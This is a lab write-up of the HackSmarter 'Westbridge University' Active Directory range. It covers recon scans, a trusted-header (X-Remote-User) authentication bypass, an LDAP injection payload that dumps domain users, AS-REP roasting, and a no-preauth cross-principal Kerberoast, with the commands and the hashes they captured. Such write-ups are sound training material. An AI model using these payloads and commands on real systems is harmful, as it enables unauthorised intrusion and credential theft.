---
layout: post
title: "HackSmarter: Westbridge University (Range)"
categories: [HackSmarter]
tags: [windows-ad, trusted-header-bypass, ldap-injection, asrep-roast, no-preauth, cross-principal-tgs, kerberoast, bloodhound, forest-trust, shadow-credentials]
tag_anchors:
  trusted-header-bypass: "#authentication-bypass--trusted-header-x-remote-user"
  ldap-injection: "#ldap-injection--full-user-dump"
  asrep-roast: "#as-rep-roasting--svclegacy"
  no-preauth: "#the-payoff--no-preauth-cross-principal-tgs-abuse"
  cross-principal-tgs: "#the-payoff--no-preauth-cross-principal-tgs-abuse"
  kerberoast: "#the-payoff--no-preauth-cross-principal-tgs-abuse"
  bloodhound: "#bloodhound-intel--the-bigger-picture"
  forest-trust: "#a-second-forest"
  shadow-credentials: "#non-default-acl-edges"
---

<img src="/assets/images/westbridge-logo.png" alt="Westbridge University" style="max-width:400px; display:block; margin:20px auto;" />

| | |
|---|---|
| **Lab** | HackSmarter — Westbridge University (Range) |
| **Goal** | Compromise the domain `westbridge.hsm` |
| **Domain** | `westbridge.hsm` (NetBIOS: `WESTBRIDGE`) |
| **Attacker** | `192.168.211.2` (tun0) |
| **Difficulty** | Easy/Medium (web foothold ➜ Kerberos abuse chain) |


### TL;DR

Follow the white rabbit to DC. 🐇 I started on the web tier of the home forest: `robots.txt` leaked a deprecated Apache config, and `people-directory.conf.bak` showed the Flask People Directory trusted an `X-Remote-User` header. With that bypass and an LDAP injection on `/api/search`, I dumped all 38 domain users. AS-REP roasting caught `svc_legacy` (preauth off, hash not in rockyou), but the real prize was the no-preauth cross-principal TGS abuse — four TGS hashes, one of them cracking to `svc_mssql : sqls3rv3r`. That credential pivoted to a hidden SQL host (SPN + DC DNS), where a silver ticket with an injected sysadmin RID gave SYSTEM via `xp_cmdshell` + CrystalPotato. The flag text pointed at `Westbridge.bak`; restoring it handed me `m.thompson : Pa$$w0rd`. That password traveled: m.thompson's GenericAll over the Students-OU let me relocate `r.anderson` and `c.wilson` into it and reset at will; r.anderson opened the Scripts share where `webserver_monitor.ps1` ran every minute as `svc_webmonitor` and authenticated to three FQDNs — I added DNS records, caught its NetNTLMv2 (`eazypassword`), shadow-credentialed `svc_files`, and rode S4U constrained delegation as Administrator to local Admin on FILES. On WEB, the FILES IT-Share had backed up the SSH key for `svc_web`; SSH in (with the SSSD fully-qualified-name quirk), cron-hijack the group-writable backup script, and a reverse shell came back as `e.mitchell`. Two roads to root: crack d.reynolds' bcrypt from `users.json` and sudo, or skip Linux priv-esc entirely by minting an AD user named `root` and letting `ksu` map `root@REALM` onto local root. Root on WEB exposed `/etc/svc_krb_t2.keytab` — a full Kerberos identity for the Tier-2 provisioning account, no password needed. Its GenericAll over IT TIER2 let me reset `s.harrison` on HELPDESK-WS; the logon bounced on `STATUS_INVALID_LOGON_HOURS` until I cleared the 21-byte bitmap with one octet-string write, and HelpDesk Workstation Admins membership finished it via WinRM. The helpdesk toolbox had `domain_defaultPW.xml`: its password fit `a.pherson`, expired-on-first-login with "cannot change password," which `kpasswd` on port 464 bypassed. a.pherson's lifecycle rights reached into `CN=Deleted Objects` — restore three tombstones, inherit j.dillon's GenericAll over IT TIER3, reset `a.owen` of CA-Manager. Then ESC4 on the CA: flip one bitmask on SmartCardAuthentication, enroll as Administrator via SAN, PKINIT the real NT hash, and Domain Admin on DC01. On the DC I found the trust memo and a KeePass DB: `researchoperator` was the sanctioned bridge account, its password in the vault. NTLM was disabled in the research forest, so from here on it was Kerberos only. ligolo tunneled me into 10.0.20.0/24; a cross-realm referral TGT proved the trust. The support-portal chat turned into instructions: Research Web Operations was Global, so Global ➜ Universal ➜ Domain Local (AD enforces the ladder), join by foreign SID, and collect password-reset rights over three accounts. Reset `r.parker` onto the research web server (direct local Administrator), targeted-kerberoast `j.bones` through t.walker's GenericWrite, drop a webshell as the app pool, CrystalPotato ➜ SYSTEM. LSA secrets on research-WEB gave up `WEB$`'s AES256 machine key — the delegated key toward the research DC itself. S4U impersonated Administrator against `cifs/DC02`, DCSync poured out every NT hash and Kerberos key in WESTBRIDGE-RESEARCH.HSM, krbtgt included. An AES-key TGT later, evil-winrm landed on DC02 as `wbresearch\administrator`. Two forests, seven hosts, seven flags — no zero-days.

---

# 1. Reconnaissance

## 1.1 Network Discovery

First, fix connectivity to the range (MTU issue over OpenVPN), then sweep the subnet:

```bash
➜ sudo ip link set dev tun0 mtu 1200

➜ fping -aqg 10.0.10.0/24
10.0.10.5
10.0.10.10
10.0.10.15
```

Three live hosts. Fingerprinting them:

```bash
➜ nxc smb 10.0.10.0/24
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)

➜ nxc ssh 10.0.10.0/24
SSH         10.0.10.10      22     10.0.10.10       [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
```

### 1.1.1 Initial Analysis

* **DC (`10.0.10.5`)** is the Domain Controller for `westbridge.hsm`. SMB signing is enforced (NTLM relay to SMB is dead on arrival), but **null auth is allowed** — anonymous enumeration is on the table.
* **WEB (`10.0.10.10`)** is Ubuntu with SSH and, per the hostname, the web tier. In labs like this the Linux box usually holds initial access.
* **FILES (`10.0.10.15`)** is a pure member server — SMB/RDP/WinRM only.

Kerberos is picky about names, so hosts first:

```bash
10.0.10.5     DC.westbridge.hsm westbridge.hsm DC
10.0.10.15    FILES.westbridge.hsm FILES
10.0.10.10    WEB.westbridge.hsm
```

## 1.2 Port Scans

Full scans of each host with default scripts (`rs-safe`, my nmap wrapper):

### WEB — 10.0.10.10

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:09:8c:42:a4:89:99:f4:02:f7:38:4f:b8:26:c4:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJUcS64255EOKZJIZAhJLudeJCIqpF1ggBGs70kr5ShnOKBi5tZv2tIU794xGzC5LOoWFCeznECJShpkt8li5Bk=
|   256 67:32:4e:26:3c:61:7d:25:10:33:ee:39:51:d1:01:c6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL7q2IpQ8akgV7wsc5BWRAW5SW86nxsGH/KqGJI4p5Q
80/tcp   open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Westbridge University | Excellence in Education & Research
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
5000/tcp open  http    syn-ack Werkzeug httpd 3.1.8 (Python 3.12.3)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/3.1.8 Python/3.12.3
|_http-title: Did not follow redirect to /login
| http-robots.txt: 1 disallowed entry
|_/static/people-directory.conf.bak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two HTTP services and — the moment I saw it — the standout finding:

> **robots.txt disallows `/static/people-directory.conf.bak`.**

A `.bak` config file, hidden behind robots.txt, on a Flask app. That's rarely accidental.

### DC — 10.0.10.5

```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-22 18:27:25Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.westbridge.hsm
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-04T17:04:11
| Not valid after:  2027-07-04T17:04:11
| MD5:     69d0 0b64 a174 8d8f 5af8 47c2 9925 4ff6
| SHA-1:   1520 b7f0 d1ac af9e 9453 7dc9 bc02 b897 7e20 508f
| SHA-256: 9d1a f795 bc5e ab84 fa1a 8383 b947 593f 0679 74a4 0ac1 7c9c a761 b72f c616 ebe5
...
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.westbridge.hsm
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-04T17:04:11
| Not valid after:  2027-07-04T17:04:11
| MD5:     69d0 0b64 a174 8d8f 5af8 47c2 9925 4ff6
| SHA-1:   1520 b7f0 d1ac af9e 9453 7dc9 bc02 b897 7e20 508f
| SHA-256: 9d1a f795 bc5e ab84 fa1a 8383 b947 593f 0679 74a4 0ac1 7c9c a761 b72f c616 ebe5
...
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.westbridge.hsm
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-04T17:04:11
| Not valid after:  2027-07-04T17:04:11
| MD5:     69d0 0b64 a174 8d8f 5af8 47c2 9925 4ff6
| SHA-1:   1520 b7f0 d1ac af9e 9453 7dc9 bc02 b897 7e20 508f
| SHA-256: 9d1a f795 bc5e ab84 fa1a 8383 b947 593f 0679 74a4 0ac1 7c9c a761 b72f c616 ebe5
...
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: westbridge.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.westbridge.hsm
| Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-04T17:04:11
| Not valid after:  2027-07-04T17:04:11
| MD5:     69d0 0b64 a174 8d8f 5af8 47c2 9925 4ff6
| SHA-1:   1520 b7f0 d1ac af9e 9453 7dc9 bc02 b897 7e20 508f
| SHA-256: 9d1a f795 bc5e ab84 fa1a 8383 b947 593f 0679 74a4 0ac1 7c9c a761 b72f c616 ebe5
...
3389/tcp  open  ms-wbt-server syn-ack
| ssl-cert: Subject: commonName=DC.westbridge.hsm
| Issuer: commonName=DC.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T12:41:18
| Not valid after:  2027-01-01T12:41:18
| MD5:     de97 5f2f b906 474e fb48 2af2 f15a 9b87
| SHA-1:   45e9 eed4 c533 ea33 e2ee e343 2eb9 7ced 122c 7e38
| SHA-256: 37c7 99cd 5c55 5ac9 618b 5661 289e 37b9 d9fc fff4 632c 5e3f 24e5 3f79 806e 2fbf
...
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: DC.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-22T18:28:23+00:00
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack Microsoft Windows RPC
49751/tcp open  msrpc         syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=8/22%Time=6A89EA12%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-22T18:28:22
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4772/tcp): CLEAN (Couldn't establish connection (TIMEOUT))
|   Check 2 (port 36881/tcp): CLEAN (Couldn't establish connection (TIMEOUT))
|   Check 3 (port 3188/udp): CLEAN (Couldn't receive bytes: TIMEOUT)
|   Check 4 (port 27591/udp): CLEAN (Couldn't receive bytes: TIMEOUT)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

A standard AD surface: DNS(53), Kerberos(88), LDAP/LDAPS(389/636), SMB(445), Global Catalog(3268), RPC, WinRM(5985). Two details worth flagging from the TLS certs:

```
Issuer: commonName=CA01-AD-CA/domainComponent=westbridge
```

There's an **AD CS certificate authority** (`CA01-AD-CA`) in this domain — ESC-hunting territory once we have credentials.

### FILES — 10.0.10.15

```bash
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: FILES
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: FILES.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-22T18:39:34+00:00
| ssl-cert: Subject: commonName=FILES.westbridge.hsm
| Issuer: commonName=FILES.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T19:53:42
| Not valid after:  2027-01-01T19:53:42
| MD5:     73cd 6957 19fc b4e8 3664 93aa 8924 ea2f
| SHA-1:   a806 59e5 b095 a802 19df 72a5 3105 a03d 699f f84d
| SHA-256: bc00 3aa2 aeca c6bf 5028 bb8e d55a e6c0 5c72 fb42 48d7 f6b3 5078 774a 4172 3826
...
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=8/23%Time=6A89ECB7%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-22T18:39:35
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32297/tcp): CLEAN (Couldn't establish connection (TIMEOUT))
|   Check 2 (port 28379/tcp): CLEAN (Couldn't establish connection (TIMEOUT))
|   Check 3 (port 42190/udp): CLEAN (Couldn't receive bytes: TIMEOUT)
|   Check 4 (port 26813/udp): CLEAN (Couldn't receive bytes: TIMEOUT)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
```

Minimal: RPC endpoints, SMB, RDP, WinRM. Nothing exposed beyond Windows defaults — this box is a destination, not a starting point.

## 1.3 Credential-less SMB Checks

With null auth flagged on the DC, quick wins first:

```bash
➜ nxc smb dc.westbridge.hsm -u '' -p ''
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\:

➜ nxc smb dc.westbridge.hsm -u guest -p ''
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\guest: STATUS_ACCOUNT_DISABLED
```

Null session works but guest is disabled, and share enumeration as anonymous yields nothing useful here. Nothing on SMB — let's pivot to web.


# 2. The Web Tier

## 2.1 Port 80 — Static University Site

```bash
➜ curl -I http://10.0.10.10
HTTP/1.1 200 OK
Date: Sat, 22 Aug 2026 18:37:15 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Sat, 18 Jul 2026 13:12:23 GMT
ETag: "9fd3-656e26c7d1bc0"
Accept-Ranges: bytes
Content-Length: 40915
Vary: Accept-Encoding
Content-Type: text/html
```

![University landing page](/assets/images/westbridge-web-port80.png)

A static marketing site for "Westbridge University" — no forms, no dynamic content, nothing to attack. Bookmarking it for OSINT (staff names, emails) and moving on.

## 2.2 Port 5000 — People Directory

Port 5000 redirects to `/login`:

```bash
➜ curl -I http://10.0.10.10:5000
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 18:45:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Connection: close
```

![People Directory login page](/assets/images/westbridge-web-port5000-login.png)

A Flask app behind Werkzeug — the university's internal People Directory. And remember what nmap found in robots.txt...

# 3. Information Disclosure — people-directory.conf.bak

The robots.txt entry points at a leftover config file:

```bash
➜ wget http://web.westbridge.hsm:5000/static/people-directory.conf.bak

➜ cat people-directory.conf.bak
# Westbridge University
# People Directory - Legacy Reverse Proxy Configuration
# DEPRECATED - retained for migration compatibility

<VirtualHost *:80>
    ServerName directory.westbridge.hsm

    ProxyPreserveHost On

    # Authentication is performed by the university SSO gateway.
    # Forward authenticated identity to the directory backend.
    RequestHeader set X-Remote-User "%{REMOTE_USER}s"

    ProxyPass        / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog  ${APACHE_LOG_DIR}/directory_error.log
    CustomLog ${APACHE_LOG_DIR}/directory_access.log combined
</VirtualHost>
```

This is the whole game in eleven lines. Reading it as an attacker:

1. In the *intended* architecture, Apache sits in front of Flask. The SSO gateway authenticates the user, Apache sets `X-Remote-User` to the authenticated identity, and proxies everything to `127.0.0.1:5000`.
2. The Flask app **trusts that header completely** — it never re-authenticates. It can afford to, because only Apache could set it... *through the proxy*.
3. But the app also listens directly on `:5000`, reachable from anywhere on the network. Nothing strips attacker-supplied headers there.

This is the classic **trusted header authentication bypass**: whenever an app derives identity from a header (`X-Remote-User`, `X-Forwarded-User`, `REMOTE_USER`, ...) without cryptographic proof, anyone who can reach the app *directly* becomes anyone they want.

# 4. Authentication Bypass — Trusted Header (X-Remote-User)

Proving it — same request, one added header:

```bash
➜ curl -I http://10.0.10.10:5000/
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 19:03:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Connection: close

➜ curl -I \
  -H 'X-Remote-User: admin' \
  http://10.0.10.10:5000/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.3
Date: Sat, 22 Aug 2026 19:03:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 44768
Connection: close
```

![Burp — adding X-Remote-User: admin bypasses login](/assets/images/westbridge-burp-xremoteuser.png)

No password, no session — just claim an identity in a header and the app believes you. We're "admin" inside the People Directory.

Exploring the authenticated app turns up a JSON search endpoint:

```
GET /api/search?q=<term>
```

and a Help page with a suspicious amount of detail about what's *not* shown:

> 🔒 Sensitive information (passwords, hashes, SPNs) are never displayed.

When an app tells you what it hides, it's telling you what it queries. Directory data like this comes from LDAP — and LDAP filters are built by string concatenation far too often.

# 5. LDAP Injection — Full User Dump

## 5.1 Finding the Injection

Baseline behavior first. A normal term returns zero results (the searchable attributes are empty in this dataset), and a bare wildcard `*` returns zero too — which makes no sense for an LDAP-backed directory unless our input lands somewhere unusual in the filter:

```
/api/search?q=a      -> {"count":0}
/api/search?q=*      -> {"count":0}
```

So let's break out of whatever clause the app builds and append our own:

```
GET /api/search?q=*)(objectClass=* HTTP/1.1
Host: web.westbridge.hsm:5000
X-Remote-User: admin
```

![Burp — LDAP injection breakout](/assets/images/westbridge-burp-ldap-inject-01.png)

```json
{"count": 38, ...}
```

![Burp — 38 accounts dumped](/assets/images/westbridge-burp-ldap-inject-02.png)

**38 accounts.** If the backend builds something like `(&(cn=<q>))`, our payload turns it into `(&(cn=*)(objectClass=*))` — always true, match everything.

No Burp needed — the whole dump fits in one curl one-liner:

```bash
➜ curl -sG -H 'X-Remote-User: admin' \
  'http://web.westbridge.hsm:5000/api/search' \
  --data-urlencode 'q=*)(objectClass=*' \
  | jq -r '.results[].username' > users.txt

➜ cat users.txt | head -n 2
Administrator
Guest
```

## 5.2 What We Got

> **Note — the web dump was stale/incomplete.** The `people-directory.conf.bak` we pulled is a *deprecated* config (its own header says so), and the data behind the directory app is equally out of date. The dump flags `m.thompson`, `c.wilson`, and `s.adams` as "Member of Administrators" — but that's the People Directory's *own* app-level role, not the live AD picture. Cross-referencing BloodHound later ([Section 9.5](#95-group-map)) shows none of them are Domain Admins; their real group memberships are what actually drive the chain. Treat this dump as a *username list*, not an authority on privileges.

The full dump breaks down as:

| Category | Accounts |
|---|---|
| Built-ins | Administrator (RID 500), Guest, krbtgt |
| **Admin-flagged in the People Directory** | `m.thompson` (1103), `c.wilson` (1105), `s.adams` (10608) — an *app-level* role the directory app assigns, **not** AD Domain Admins; their real AD groups are in [Section 9.5](#95-group-map) |
| Service accounts | `svc_legacy`, `svc_mssql`, `svc_files`, `svc_web`, `svc_krb_t2`, `svc_webmonitor` |
| Regular users | ~25 accounts in `f.last` format |


Service accounts are kerberoast targets by definition — and `svc_krb_t2` ("Tier 2"?), plus an account literally named `researchoperator`, smell like plot-relevant.

One limitation worth documenting: injected clauses *after* the breakout are ignored by the backend — every probe (`servicePrincipalName=*`, `userPassword=*`, nonsense filters) returned the identical 38 results. No boolean oracle here; the dump was the win.

# 6. AS-REP Roasting — svc_legacy

With 38 usernames and zero passwords, the classic no-credential Kerberos attack is AS-REP roasting: accounts with *"Do not require Kerberos preauthentication"* will hand their own encrypted blob to anyone who asks.

```bash
➜ GetNPUsers.py westbridge.hsm/ \
    -usersfile users.txt \
    -no-pass \
    -dc-ip 10.0.10.5 \
    -request
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User m.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
# ... (33 more users tested — all without UF_DONT_REQUIRE_PREAUTH) ...

$krb5asrep$23$svc_legacy@WESTBRIDGE.HSM:73ae62575857584e65c5b3646abbfd90$348f348c5d47ca6283a50050a78c676f8a0df3251dfd44a94013eb5328c347fe0b$046149511ad8aa15ae3f0ffe468b8b65f71349b424e64638a43d0c7d2089ffaf7a$3e697be6c06facc7fb00689e6b33f20a3f87947dcdbb52ff8448ea9fbf40a0af92$b486d7f845905931e3
...
```

One hit out of 38: **`svc_legacy`** has preauthentication disabled. Etype 23 (RC4) — crackable?

Identifying and cracking:

```bash
➜ hashcat --identify /tmp/hash.txt
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

➜ hashcat -a 0 -m 18200 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

...[snip]...
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc_legacy@WESTBRIDGE.HSM:46e56a93f23...a97dc1
```

**Exhausted.** rockyou didn't crack it — the password isn't in the list. A lot of people would stop here. Don't. The account still has preauth disabled, and that property is worth more than its password.

# 7. The Payoff — No-Preauth Cross-Principal TGS Abuse

## 7.1 Why This Works

> I already walked the protocol-level mechanism behind this — the AS-REQ `sname` trick (Charlie Clark / Semperis' ["as-requested STs"](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/) discovery) and how NetExec's `--no-preauth-targets` exploits it — in my [Gotham (barbhack24) writeup, Section 3.3](https://secretmyth.blog/netexec/nxc-barbhack24-gotham/#33-kerberoasting-without-authentication). That's the *why* of unauthenticated Kerberoasting. This section focuses on the **Westbridge-specific twist**: the *cross-principal* TGS abuse that reaches accounts normal Kerberoasting never could.

Two facts matter for this box, restated so the rest of the chain makes sense:

1. An account with `UF_DONT_REQUIRE_PREAUTH` lets the KDC skip the "prove you know your key" check **for any request claiming that identity** — and the KDC never verifies the requester *is* `svc_legacy` either. It just issues the TGT.
2. Holding that TGT, you can ask the KDC for service tickets to *any* SPN you name — including principals that aren't service accounts.

The Gotham writeup used this against a service account that already had an SPN (`joker`). Westbridge goes further: the same no-preauth TGT requests a TGS for **accounts with no SPN at all** — that's the *cross-principal* twist, and why `svc_legacy` (whose hash we never cracked) still yielded krbtgt / svc_mssql / svc_files / svc_krb_t2. `GetUserSPNs.py -no-preauth` does it in one call (run in [Section 7.2](#72-execution)).

## 7.2 Execution

```bash
➜ GetUserSPNs.py westbridge.hsm/ \
    -usersfile users.txt \
    -no-preauth svc_legacy \
    -dc-host 10.0.10.5
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: krbtgt - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
# ... (30 more principals — all KDC_ERR_S_PRINCIPAL_UNKNOWN) ...

$krb5tgs$18$krbtgt$WESTBRIDGE.HSM$*krbtgt*$159d0ffc3efbe38349bcea62$41f0ea55fe840ed0fea2aaad9ed32064c29f0f2b7f1465912d7f698c41cca1f3ec$e904fb780f835db21914d1f5eb79e3d834723322a731e44cdb73999830e6c51c4c$07abdb725cdd8b393e6d82bc03b7b1cbbdad747ac8afb0a09fa69c6da2639db8ca$d610ea2d3d8387e094ab8d594651efb8aad7d57c1464cdf4bb04d68a9b6b4b998...
...
$krb5tgs$23$*svc_mssql$WESTBRIDGE.HSM$svc_mssql*$1528fc999bc1703f5b593$3e9850f7380$aeafb8753b46b03feaf3ae59a5a540969185588b7cdc2ad1fb009537$010ca7f643b911584b8e1eaf9573266474ee4cdb94f149ac99678db98090fa2355$b1f42ecf76dd802f2e190c01e6ce00dae1fffb74a273e26208ec0cdec4801732fe$3bc37014971d93f04f60ab6ba9d6567fec39559a2f606d716a1db4c510d96ceb...
...
$krb5tgs$18$svc_files$WESTBRIDGE.HSM$*svc_files*$de446d9287008dd5868c8$a9f$5348cd51a2e36271230376c498aad29825754f6f8ec076d2f8b4778f86cf8d$4114ec07bed888d74385fab21e38e0b4f99da33705b92b1d0a3e72b07f19f6e7e6$8e59a93dfb57de3aff53438e4a3655c63046aff0eda055060e241a9697fdaf3654$147e652a28409b35f3662dfe67468bff926dd36a487c0213bc3c788f92560bb92...
...
